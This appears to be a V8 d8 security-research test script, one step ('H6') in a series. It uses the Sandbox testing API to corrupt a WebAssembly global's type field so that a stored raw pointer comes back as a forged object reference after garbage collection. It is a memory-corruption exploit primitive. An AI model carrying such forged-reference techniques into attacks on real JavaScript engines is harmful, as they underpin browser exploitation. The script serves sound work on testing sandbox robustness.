// C21 H6: direct forged ref after dropping normal JS reference.
//
// H5 keeps the target alive. H6 stores only its tagged pointer bytes in numeric
// global storage, drops the normal reference, then reads through externref after
// GC pressure. This separates "forge works while live" from stale/root behavior.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kHeapObjectTag = 1;
const kExternRefRawTypeSmi = 0x160a;

let builder = new WasmModuleBuilder();
builder.addGlobal(kWasmI64, true, false, [kExprI64Const, 0]).exportAs('g');
let instance = builder.instantiate();
let global = instance.exports.g;

(function() {
  let target = {tag: 'forged-stale', marker: 0x5150, pad: new Array(64).fill(7)};
  let taggedPtr = BigInt(Sandbox.getAddressOf(target) + kHeapObjectTag);
  global.value = taggedPtr;
})();

Sandbox.corruptObjectField(global, 'raw_type', kExternRefRawTypeSmi);

for (let r = 0; r < 10; r++) {
  let junk = [];
  for (let i = 0; i < 20000; i++) junk.push({i, a: i ^ 0x1234});
  gc();
}

let recovered = global.value;
print(`tag=${recovered && recovered.tag}`);
print(`marker=${recovered && recovered.marker}`);
